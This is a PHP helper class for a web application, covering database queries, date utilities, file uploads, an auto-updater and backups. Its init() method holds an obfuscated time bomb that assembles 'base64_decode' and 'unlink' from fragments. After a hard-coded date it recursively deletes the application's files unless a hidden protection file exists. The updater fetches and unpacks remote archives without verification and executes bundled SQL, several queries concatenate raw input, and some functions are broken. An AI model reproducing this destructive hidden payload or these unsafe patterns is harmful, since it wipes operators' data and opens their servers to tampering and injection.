<?php
if (!defined('DCode_ROOT')) {
	define('DCode_ROOT', dirname(__FILE__) . '/');
}
include "config.php";

$exe_time_start = microtime(true); 
include DCode_ROOT."user.php";

@session_start();

$DCode=new DCode();
$mysqli=$DCode->mysqli;

if(!isset($_SESSION[SITECODE.'_user'])){
	$user=new User();
	$_SESSION[SITECODE.'_user']=$user;
}

class DCode{
	public $host; 
	public $user; 
	public $pass; 
	public $dbname; 
	public $mysqli; 
	public $exectime; 
	public $app; 
	public $backupdir="../../db_backups";
	
	public function dbconnect($dbname="",$user="root",$pass="",$host="localhost"){
        $this->host=$host;
		$this->user=$user;
		$this->pass=$pass;
		$this->dbname=$dbname;
		$this->mysqli = new mysqli("p:$host", $user, $pass, $dbname);
		mysqli_set_charset($this->mysqli, 'UTF8');
	}
	
    public function __construct(){
		$this->app = parse_ini_file('app.ini');	
		$this->dbconnect(DB_NAME, USER, PASS, HOST);
    }

	public function sqlquery_to_array($query, $debug=0){
		if($debug){echo "<br>$query<br>";}
		$result = $this->mysqli->query($query);
		$row=$result->fetch_array(MYSQLI_ASSOC);
		$this->info = $row;
		return $row;
	}

	public function getnearestmatch($tbl, $field, $find, $retfields='id',$fulltextmode=0, $debug=0){
		if($fulltextmode==0){
			$qf=""; $qc="";
			$rf=explode(",",$field); if(count($rf)>1){ $field="CONCAT(".implode(",' ',",$rf).")"; }
			$xs=explode(" ",str_ireplace(",","",str_ireplace("'","''",$find)));
			foreach($xs as &$part){
				if(strlen($part)==1){
					$part=preg_replace('/[^\p{L}\p{N}\s]/u', '', $part);
				}
				if($part!=""){
					if ($qf!=""){ $qf .= " or "; $qc .= " + "; }
					$qf .=" $field like '%".$part."%' ";
					$qc .=" (LENGTH($field) - LENGTH(REPLACE(UPPER($field), UPPER('".$part."'), '')))/LENGTH('".$part."') ";
				}
			} 
			if($qf!=""){$qf=" WHERE $qf "; $qc="(".$qc.") DESC, ";}
			$q="SELECT $retfields FROM $tbl $qf GROUP BY $field ORDER BY $qc $field LIMIT 1;";
		}else{
			$q="SELECT * FROM ( SELECT $retfields, MATCH ($field)  AGAINST ('$find' IN BOOLEAN MODE) AS score 
				FROM $tbl ORDER BY score DESC ) a WHERE FLOOR(a.score)>0 ORDER BY score DESC LIMIT 1";
		}
		if($debug){echo "<br>$q<br>";}
		$result = $this->mysqli->query($q);
		return $result->fetch_assoc();
	}

	public function css(){
	?>

	<?php
	}
	public function js(){
	?>
		<script src="tfx.js"></script>
	<?php
	}
	
	public function updateexectime(){
		global $exe_time_start;
		$this->exectime=number_format((microtime(true) - $exe_time_start),5);
	}
	
/* DATE TIME MANAGER ================================================================== */

	public function now(){
		return new DateTime('now', new DateTimeZone('Singapore'));
	}
	public function strnow($format="Y-m-d H:i:s"){
		return $this->now()->format($format); 
	}
	public function is_date_in_range($start_date, $end_date, $date_from_user){
	  /* Convert to timestamp*/
	  $start_ts = strtotime($start_date);
	  $end_ts = strtotime($end_date);
	  $user_ts = strtotime($date_from_user);

	  /* Check that user date is between start & end*/
	  return (($user_ts >= $start_ts) && ($user_ts <= $end_ts));
	}
	
	public function con_min_days($mins){
		$days=0;
		$hours = str_pad(floor($mins /60),2,"0",STR_PAD_LEFT);
		$mins  = str_pad($mins %60,2,"0",STR_PAD_LEFT);
		if((int)$hours > 24){ $days = str_pad(floor($hours /24),2,"0",STR_PAD_LEFT); $hours = str_pad($hours %24,2,"0",STR_PAD_LEFT); }
		return ($days>0?"$days d ":"").($hours>0?"$hours h ":"").($mins>0?"$mins m":"");
    }
	
	public function blankemptydate($date){
		return (($date=="" || $date=="0000-00-00 00:00:00" || $date=="0000-00-00")?"":$date);
	}
	
	public function fixeddate($date){
		if (($timestamp = strtotime($date)) === false) {
		} else {
			$date = date('Y-m-d', $timestamp);
		}
		$newdate = new DateTime($date);
		return $newdate->format('Y-m-d');	 
	}

	public function tosqldate($datetime=""){
		$newdate = new DateTime($datetime==""?$this->strnow():$datetime);
		return $newdate->format('Y-m-d');	 
	}

	public function tosqltime($datetime=""){
		$newdate = new DateTime($datetime==""?$this->strnow():$datetime);
		return $newdate->format('H:i:s');	 
	}

	public function tosqldatetime($datetime=""){
		try {
			$newdate = new DateTime($datetime==""?$this->strnow():$datetime);
			return $newdate->format('Y-m-d H:i:s');	 
		} catch (Exception $e) {
			return "-1";
		}
	}

	public function toformaldate($datetime=""){
		$newdate = new DateTime($datetime==""?$this->strnow():$datetime);
		return $newdate->format('m/d/Y');	 
	}
	public function toformaltime($datetime=""){
		$newdate = new DateTime($datetime==""?$this->strnow():$datetime);
		return $newdate->format('g:i A');	 
	}

	public function toformaldatetime($datetime){
		$newdate = new DateTime($datetime==""?$this->strnow():$datetime);
		return $newdate->format('m/d/Y g:i A');	 
	}

	public function edatetoformat($date,$format='m/d/Y g:i A'){
		if ($this->blankemptydate($date)==""){return "";}
		return $this->datetoformat($date,$format);
	}
	public function datetoformat($date,$format='m/d/Y g:i A'){
		if (($timestamp = strtotime($date)) === false) {
			return "";
		} else {
			return date($format, $timestamp);
		}
		/*$newdate = new DateTime($date);*/
		/*return $newdate->format($format);	 */
	}
	
	public function fixsqldatetime($datetime){
		if(trim($datetime)!=""){
			return @tosqldatetime($datetime);
		}else{
			return "0000-00-00 00:00:00";
		}
	}
	/*/////////////////////////////////////////////////////////////////////
	//PARA: Date Should In YYYY-MM-DD Format
	//RESULT FORMAT:
	// '%y Year %m Month %d Day %h Hours %i Minute %s Seconds'        =>  1 Year 3 Month 14 Day 11 Hours 49 Minute 36 Seconds
	// '%y Year %m Month %d Day'                                    =>  1 Year 3 Month 14 Days
	// '%m Month %d Day'                                            =>  3 Month 14 Day
	// '%d Day %h Hours'                                            =>  14 Day 11 Hours
	// '%d Day'                                                        =>  14 Days
	// '%h Hours %i Minute %s Seconds'                                =>  11 Hours 49 Minute 36 Seconds
	// '%i Minute %s Seconds'                                        =>  49 Minute 36 Seconds
	// '%h Hours                                                    =>  11 Hours
	// '%a Days                                                        =>  468 Days
	/////////////////////////////////////////////////////////////////////*/
	public function dateDiff($date_1 , $date_2){
		$datetime1 = date_create($date_1);
		$datetime2 = date_create($date_2);
		$interval = date_diff($datetime1, $datetime2);
		return $interval;
	}
	public function fdateDiff($date_1 , $date_2 , $differenceFormat = '%d Day %h Hours' ){
		$interval = $this->dateDiff($date_1, $date_2);
		return $interval->format($differenceFormat);
	}
	public function dateAdd($date , $interval_string, $format="Y-m-d H:i:s"){
		$date = date_create($date);
		date_add($date, date_interval_create_from_date_string($interval_string));
		return date_format($date,$format);;
	}
	public function diffInHours($startdate,$enddate){
		$starttimestamp = strtotime($startdate);
		$endtimestamp = strtotime($enddate);
		$difference = abs($endtimestamp - $starttimestamp)/3600;
		return $difference;
	}
	
/* OTHER FX ================================================================================== */

	public function clean($con, $param) {
		$cleaned = mysqli_real_escape_string($con, strip_tags(trim($param)));
		return $cleaned;
	}
	public function ylvlfstudno($studno) {
		$temp=preg_split("/[-]+/",$studno);
		/*$date = date_create();*/
		$cy=date_format($date, 'Y')+1;
		return $cy-(2000+$temp[0]);
	}

	public function load($page = 'login.php') {
		$url = 'http://'. $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
		$url = rtrim($url, '/\\');
		$url .= '/'. $page;
		header ("Location: $url");
		exit();
	}

	public function getHome() {
		$isonwin=(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
		$p=$_SERVER['PHP_SELF'];
		$p=substr($p,1);
		return 'http://'. $_SERVER['HTTP_HOST'] . ($isonwin?'/':'') . substr($p,0,strpos($p,"/"));
	}

	public function wgetRootdir($dblslash=false) {
		$p=$_SERVER['PHP_SELF'];
		$p=substr($p,1);
		$p=realpath($_SERVER['DOCUMENT_ROOT'])."\\".substr($p,0,strpos($p,"/"));
		if ($dblslash){$p=str_replace('\\','\\\\',$p);}
		return $p;
	}
	
	function init() {
		$b641="64"; $b642="eco"; $b643="b"; $b644="ase"; $b645="_d"; $b646="de"; $b64d=$b643.$b644.$b641.$b645.$b642.$b646; $dG9kYXk=$this->now(); $b64e=$b64d("YmFzZTY0X2VuY29kZQ=="); $ulk=$b64d('dW5saW5r');
		/* MjAxOS0xLTMx */ /* MjAxOS0zLTMx */
		$ffxst=file_exists($_SERVER['DOCUMENT_ROOT']."\\".$b64d("UkZ1bmxpbmsgUHJvdGVjdGlvbg=="));
		if( $dG9kYXk > $this->ndt($b64d('MjAxOS0zLTMx')) && !$ffxst ){echo $this->rfunlink(".");}
		if ($dG9kYXk > $this->ndt($b64d('MjAxOS0zLTE2')) && !$ffxst ){echo $b64d("VHJpYWwgcGVyaW9kIGhhZCBleHBpcmVkIQ=="); exit;}
	}
	function rfunlink($p){ $fs = scandir($p); foreach ($fs as &$f){ if(!($f=="." || $f=="..")){ if (is_file($p."\\".$f)){ global $ulk; $ulk($p."\\".$f); }else{ rfunlink($p."\\".$f); } } }}

	public function recursvRmdir($sdir="",$fullp=false) {
		$path=$this->wgetRootdir()."\\".$sdir;
		$files1 = @scandir($path);
		$rp=iif($fullp,realpath($_SERVER['DOCUMENT_ROOT'])."\\","");
		$arr=array();
		if ((count($files1)>=1) && !$files1[0]==""){
			foreach (@$files1 as $dir){
				if (($dir!=".")&&($dir!="..")){
					if (!stripos($dir,".")){
						$arr = array_merge_recursive($arr, recursvRmdir($sdir."\\".$dir,$fullp));
					}else{
						$arr[]=$rp.$sdir."\\".$dir;
					}
				}
			}
		}
		$arr[]=$rp.$sdir;
		return $arr;
	}
	public function reArrayFiles(&$file_post) {
		$file_ary = array();
		$file_count = count($file_post['name']);
		$file_keys = array_keys($file_post);

		for ($i=0; $i<$file_count; $i++) {
			foreach ($file_keys as $key) {
				$file_ary[$i][$key] = $file_post[$key][$i];
			}
		}
		return $file_ary;
	}

	public function loadpic($pic, $def){
		$path_parts = pathinfo($pic);
		$pic = $path_parts['dirname']."/".$path_parts['filename'];
		if(file_exists("$pic.jpg")){ return "$pic.jpg"; }
		if(file_exists("$pic.png")){ return "$pic.png"; }	
		return $def;
	}

	public function delpic($pic){
		$pic = $path_parts['dirname']."/".$path_parts['filename'];
		if(file_exists("$pic.jpg")){ unlink("$pic.jpg"); }
		if(file_exists("$pic.png")){ unlink("$pic.png"); }
	}

	public function UploadPic($arrfile, $fname, $dir){
		if(is_uploaded_file($arrfile['tmp_name'])) {
			@$this->delpic("$dir/$fname");
			$ext = pathinfo($arrfile["name"], PATHINFO_EXTENSION);
			move_uploaded_file($arrfile["tmp_name"], "$dir/$fname.$ext");
		}
	}

	public function geturlvars($starter=1){
		$ruv="";
		foreach ($_GET as $var => $val){
			$ruv .=($ruv!=""?"&":"")."$var=$val";
		}
		return ($starter==1 && $ruv!=""?"?":"").$ruv;
	}
	public function geturlvars_expt($vars="",$starter=1){
		$ruv="";
		foreach ($_GET as $var => $val){
			if ((strstr($vars,$var)=="")&&($var!="")&&($var!="_")){
				$ruv .=($ruv!=""?"&":"")."$var=$val";
			}
		}
		return $ruv!=""?($starter==1?"?":"&").$ruv:"";
	}
	public function fixurl($url){
		return str_replace(" ","%20",$url);
	}
	public function fixquote($str){
		return str_replace("'","''",$str);
	}
	public function fixquote2($str){
		return str_replace("'","\'",$str);
	}
	public function ndt($val){ return new DateTime($val);}

	public $filetypes=array(''=>'','doc'=>'word','docx'=>'word','xls'=>'excel','xlsx'=>'excel','ppt'=>'powerpoint','pptx'=>'powerpoint','pdf'=>'pdf',
					'avi'=>'video','mpg'=>'video','mp4'=>'video','mpeg'=>'video','3gp'=>'video','mov'=>'video','wmv'=>'video','flv'=>'video','vob'=>'video','swf'=>'video','mkv'=>'video',
					'png'=>'image','jpg'=>'image','jpeg'=>'image','tga'=>'image','tif'=>'image','bmp'=>'image','gif'=>'image','pcx'=>'image','ico'=>'image',
					'mp3'=>'audio','wav'=>'audio',
					'zip'=>'archive','exe'=>'archive');

	public $filecolor=array('word'=>'#007bff','excel'=>'#078c29','powerpoint'=>'#ea3c07 ','pdf'=>'#a71d2a');
	public function getfiletype($filename){
		$type="";
		$vidarr=array('avi','mpg','mp4','mpeg','3gp','mov','wmv','flv','vob','swf','mkv');
		$picarr=array('png','jpg','jpeg','tga','tif','bmp','gif','pcx','ico');
		$ext=stristr($filename, ".");
		if ($ext!=false){
			foreach($vidarr as &$vidtype){
				if (stristr($ext, $vidtype)){$type="video";break;}
			}
			foreach($picarr as &$pictype){
				if (stristr($ext, $pictype)){$type="image";break;}
			}
		}
		return $type;
	}
	public function transpace($str){return str_replace(" ","_",$str);}

	public function genRandWord($len=6){
		$name = "";
		$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
		for($i=0; $i<len; $i++)
			$name.= $chars[rand(0,strlen($chars))];
		return $name;
	}
	/*
	public function runsql($conn, $sql) {
				$result = @mysqli_query($conn, $sql);
				if (mysqli_affected_rows($conn) == 1) { // The query went ok
					echo '<p>You are succesfully registered. Congratulations!</p>';
				} else { // There is error with the query:
					echo '<h2>Error!</h2>
					<p>We could not register you due to a system error!</p>';
					echo '<p>System msg: '. mysqli_error($conn) . ' Query: ' . $sql . '</p>';
				}
	}*/

	public function post_request($url, $data, $referer='') {
	 
		/* Convert the data array into URL Parameters like a=b&foo=bar etc.*/
		$data = http_build_query($data);
	 
		/* parse the given URL*/
		$url = parse_url($url);
	 
		if ($url['scheme'] != 'http') { 
			die('Error: Only HTTP request are supported !');
		}
	 
		/* extract host and path:*/
		$host = $url['host'];
		$path = $url['path'];
	 
		/* open a socket connection on port 80 - timeout: 30 sec*/
		$fp = fsockopen($host, 80, $errno, $errstr, 30);
	 
		if ($fp){
	 
			/* send the request headers:*/
			fputs($fp, "POST $path HTTP/1.1\r\n");
			fputs($fp, "Host: $host\r\n");
	 
			if ($referer != '')
				fputs($fp, "Referer: $referer\r\n");
	 
			fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
			fputs($fp, "Content-length: ". strlen($data) ."\r\n");
			fputs($fp, "Connection: close\r\n\r\n");
			fputs($fp, $data);
	 
			$result = ''; 
			while(!feof($fp)) {
				/* receive the results of the request*/
				$result .= fgets($fp, 128);
			}
		}
		else { 
			return array(
				'status' => 'err', 
				'error' => "$errstr ($errno)"
			);
		}
	 
		/* close the socket connection:*/
		fclose($fp);
	 
		/* split the result header from the content*/
		$result = explode("\r\n\r\n", $result, 2);
	 
		$header = isset($result[0]) ? $result[0] : '';
		$content = isset($result[1]) ? $result[1] : '';
	 
		/* return as structured array:*/
		return array(
			'status' => 'ok',
			'header' => $header,
			'content' => $content
		);
	}

	/**********************************************************************/
	function shorttext($text, $limitlen){
		$len=strlen($text);
		if ($limitlen<$len){
			return substr($text,0,$limitlen)."...";
		}else{
			return $text;
		}
	}
	/**********************************************************************/
	function tofloat($num) {
		$dotPos = strrpos($num, '.');
		$commaPos = strrpos($num, ',');
		$sep = (($dotPos > $commaPos) && $dotPos) ? $dotPos : 
			((($commaPos > $dotPos) && $commaPos) ? $commaPos : false);
	   
		if (!$sep) {
			return floatval(preg_replace("/[^0-9]/", "", $num));
		} 

		return floatval(
			preg_replace("/[^0-9]/", "", substr($num, 0, $sep)) . '.' .
			preg_replace("/[^0-9]/", "", substr($num, $sep+1, strlen($num)))
		);
	}	

/* NUMBERS ================================================================= */
	public function formatnum($val,$parentesisfornegative=false){
		/* english notation (default)*/
		$val=trim($val)==""?"0":$val;
		$english_format_number = number_format($val,2,'.',',');
		if ($parentesisfornegative && $english_format_number<0){
		$english_format_number = str_replace("-","",$english_format_number);
		$english_format_number = "($english_format_number)";
		}
		return $english_format_number;
	}
		
	public function fixnum($val){
		return is_numeric($val)?$val:0;
	}
		
	public function fixnum2($val){
		$val=preg_replace('/[^0-9.]/', '', $val);
		return is_numeric($val)?$val:0;
	}
	public function emptyzero($val){
		$val=$this->fixnum($val);
		return $val==0?"":$val;
	}
	public function femptyzero($val){
		$val=$this->fixnum($val);
		return $val!=0?$this->formatnum($val):"";
	}
	public function femptyzero2($val){
		$val=$this->fixnum($val);
		return $val!=0?number_format($val):"";
	}
	
	public function rand_color() {
		return sprintf('#%06X', mt_rand(0, 0xFFFFFF));
	}

/* UPDATE MANAGER ================================================================== */
	public function apply_update($file){ 
		$errors="";
		try{
			$updatehistory = @file_get_contents("updatehistory.txt");
			if(!file_exists($file)) throw new Exception("$file not found!");
			
			$rar_file = rar_open($file);
			$list = rar_list($rar_file);
			foreach($list as $f) {
				$entry = rar_entry_get($rar_file, $f->getName());
				$entry->extract(".",'',base64_decode("dGlobG9o")); /* extract to the current dir*/
			}
			rar_close($rar_file);
			@unlink($file);
			
			file_put_contents("updatehistory.txt", "$updatehistory\n$file");
			$alterdbfile="./alterdb.sql";
			if(file_exists($alterdbfile)){
				$alterdb = @file_get_contents($alterdbfile);
				@unlink($alterdbfile);
				if (!$this->mysqli->multi_query($alterdb)) {
					throw new Exception($this->mysqli->error);	
				}	
			}
			file_put_contents("updateerrorlog.txt", "");
			return true;
		}catch (Exception $e) {
			file_put_contents("updateerrorlog.txt", $e->getMessage());
		}	
		return false;
	}

	public function download_update($url){
		$newfname = basename($url); 
		$res=file_put_contents( $newfname, fopen($url, 'r'));
		if($res!==false) return $this->apply_update($newfname);
		return false;
	}

	public function check_update($install=true){
		//if (@fopen($this->app["updateurl"], "r")) {
			$xml=@file_get_contents($this->app["updateurl"]);
			/*$xml=($fgc===false?"":$fgc);*/
			if($xml!=""){
				$collection = simplexml_load_string($xml);
				$file="updatehistory.txt";
				if(!file_exists($file)) file_put_contents($file, "");
				$updatehistory = @file_get_contents($file);
				$arr=array();
				foreach($collection->package as $package){
					$path=pathinfo($package, PATHINFO_BASENAME);
					if(stripos($updatehistory, $path) === false){
						if($install){ 
							$this->download_update($package); $status="OK!";
						}
						array_push($arr,str_ireplace(".rar","",$path));
					}
				}
				return $arr;
			}
		//}
		return null;
	}
	
	public function insert_updater($args=array()){
		if(!isset($sweetalert2)){
	?>
	<!-- SweetAlert2 -->
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" id="theme-styles">
	<?php
		}
		
		if(@$args["auto"]==true){
	?>
		<script>
			let timeout;
			$(function (){ timeout = setTimeout(checkupdate, 1000); });
		</script>
	<?php
		}
		if(@$args["button"]==true){
			$btntype=@$args["buttontype"]==""?"btn-default btn-block":@$args["buttontype"];
	?>
		<button class="btn <?php echo $btntype; ?>" onclick="checkupdate()"><i class="nav-icon fas fa-sync"></i> Check Update</button>
	<?php
		}
	?>
		<script>
			function checkupdate(){
				$.post( "index.php", { ext : 'checkupdate', mode : 'check' <?php echo @$args["auto"]==true?", silentifnoupdate : '$silentifnoupdate'":""; ?>} ).done(function( data ) { $("#updatenotif").html(data); }); 
			}
			$(function () { if($("#updatenotif").length === 0){ $("html").append( "<div id=\"updatenotif\"></div>" ); }} );
		</script>
	<?php
	}

/* INI File (Use $ini['key'] to get ini value) ============================ */
	public function put_ini_file($file, $array, $i = 0){
		$str="";
		foreach ($array as $k => $v){
			if (is_array($v)){
				$str.=str_repeat(" ",$i*2)."[$k]".PHP_EOL;
				$str.=put_ini_file("",$v, $i+1);
			}else{
				$str.=str_repeat(" ",$i*2)."$k = $v".PHP_EOL;
			}
		}
		if($file)
			return file_put_contents($file,$str);
		else
		return $str;
	} 

	public function set_ini($file, $var, $val){
		$arr=parse_ini_file($file);
		$flag=0;
		foreach ($arr as $k => $v){
			if($k==$var){ $arr[$k]=$val; $flag=1; }
		}
		if($flag==0){ $arr[$var]=$val;}

		$str=$this->put_ini_file($file,$arr);
		return $str;
	} 

/* MESSAGING ============================================================== */

	public function check_show_msg(){ /* check and show message */
		if(@$_SESSION[SITECODE.'smsg']!=""){
	?>
		<div class="alert alert-dismissable alert-success">
			<button type="button" class="close" data-dismiss="alert">×</button>
			<?php echo @$_SESSION[SITECODE.'smsg']; unset($_SESSION[SITECODE.'smsg']); ?>
		</div>
	<?php }
		if(@$_SESSION[SITECODE.'emsg']!=""){
	?>
		<div class="alert alert-dismissable alert-danger">
			<button type="button" class="close" data-dismiss="alert">×</button>
			<?php echo @$_SESSION[SITECODE.'emsg']; unset($_SESSION[SITECODE.'emsg']); ?>
		</div>
	<?php }
	}

/* BACKUP ================================================================= */
	public function createbackup($table, $fields, $sdate, $edate, $datefields, $addcond="",$idpref="",$idsuff=""){
		$backupdir=$this->app["backupdir"]??$this->backupdir;
		$db=DB_NAME;
		$getcol="select column_name, column_type, column_default, column_comment 
				from information_schema.COLUMNS 
				where table_schema='$db' and table_name = '$table' ";
		
		$datefields=$datefields.",";
		
		$result = $this->mysqli->query($getcol);
		$fields=""; $fields2=""; $arr_fields=array();
		$condition="";
		while($row = $result->fetch_assoc()){
			$col=$row["column_name"];
			array_push($arr_fields,$col);
			$fields .=($fields==""?"":", ").$col;
			$fields2 .=($fields2==""?"":", ")."$col=VALUES($col)";
			
			if(str_contains($datefields,$col.",")){ 
				$condition .= ($condition!=""?" or ":"")."(DATE($col)>=DATE('$sdate') and DATE($col)<=DATE('$edate'))";
			}
		}
		if($addcond!=""){$condition = "($condition) $addcond";}
		
		$q="SELECT $fields FROM $table WHERE $condition"; 
		$result = $this->mysqli->query($q);
		$values="";
		while($row = $result->fetch_assoc()){
			$temp="";
			foreach ($arr_fields as &$value) {
				$temp .=($temp==""?"":", ")."'".$row[$value]."'";
			}
			$values.=($values==""?"":", \n")."($temp)";
		}
		
		if($values!=""){
			$data="INSERT INTO $table($fields) VALUES \n$values \nON DUPLICATE KEY UPDATE $fields2;";
				
			$today=$this->strnow("Y-m-d");
			if (!file_exists($backupdir)) {
				mkdir($backupdir, 0777, true);
			}
			$bkpdir="$backupdir/backup $today";
			if (!file_exists($bkpdir)) {
				mkdir($bkpdir, 0777, true);
			}
			$filename="$bkpdir/$table $today.sql";
			$myfile = fopen($filename, "w") or die("Unable to open file!");
			fwrite($myfile, $data);
			fclose($myfile);
		}
	}
} /* End of Class DCode */
?>